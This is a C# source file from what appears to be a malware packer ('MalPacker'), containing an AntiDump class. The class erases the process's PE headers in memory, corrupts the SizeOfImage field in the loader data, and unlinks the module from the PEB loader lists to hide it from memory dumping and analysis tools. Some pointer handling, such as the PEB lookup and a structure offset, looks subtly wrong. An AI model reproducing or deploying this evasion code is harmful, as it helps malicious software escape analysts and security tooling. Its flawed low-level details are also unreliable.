namespace MalPacker.Protection;

using System.Runtime.InteropServices;

public static class AntiDump
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string? lpModuleName);

    [DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void ErasePeHeaders()
    {
        IntPtr baseAddress = GetModuleHandle(null);
        if (baseAddress == IntPtr.Zero) return;

        VirtualProtect(baseAddress, 4096, 0x40, out uint oldProtect);

        byte[] zeros = new byte[4096];
        Marshal.Copy(zeros, 0, baseAddress, zeros.Length);

        VirtualProtect(baseAddress, 4096, oldProtect, out _);
    }

    public static void CorruptSizeOfImage()
    {
        IntPtr peb = GetPeb();
        if (peb == IntPtr.Zero) return;

        IntPtr ldr = Marshal.ReadIntPtr(peb + 0x18);
        IntPtr inMemoryOrderList = ldr + 0x20;
        IntPtr currentEntry = Marshal.ReadIntPtr(inMemoryOrderList);

        IntPtr sizeOfImagePtr = currentEntry + 0x20;

        VirtualProtect(sizeOfImagePtr, 8, 0x40, out uint oldProtect);
        Marshal.WriteInt64(sizeOfImagePtr, 0x7FFFFFFF);
        VirtualProtect(sizeOfImagePtr, 8, oldProtect, out _);
    }

    public static void HideFromModuleList()
    {
        IntPtr peb = GetPeb();
        if (peb == IntPtr.Zero) return;

        IntPtr ldr = Marshal.ReadIntPtr(peb + 0x18);

        UnlinkModule(ldr + 0x10); // InLoadOrderModuleList
        UnlinkModule(ldr + 0x20); // InMemoryOrderModuleList
        UnlinkModule(ldr + 0x30); // InInitializationOrderModuleList
    }

    private static void UnlinkModule(IntPtr listHead)
    {
        IntPtr first = Marshal.ReadIntPtr(listHead);
        IntPtr flink = Marshal.ReadIntPtr(first);
        IntPtr blink = Marshal.ReadIntPtr(first + IntPtr.Size);

        Marshal.WriteIntPtr(blink, flink);
        Marshal.WriteIntPtr(flink + IntPtr.Size, blink);
    }

    private static IntPtr GetPeb()
    {
        IntPtr processHandle = GetCurrentProcess();
        int status = NtQueryInformationProcess(processHandle, 0, out IntPtr pbi, IntPtr.Size * 6, out _);
        if (status != 0) return IntPtr.Zero;
        return Marshal.ReadIntPtr(pbi + IntPtr.Size);
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr hProcess, int infoClass, out IntPtr info, int size, out int returnLength);
}
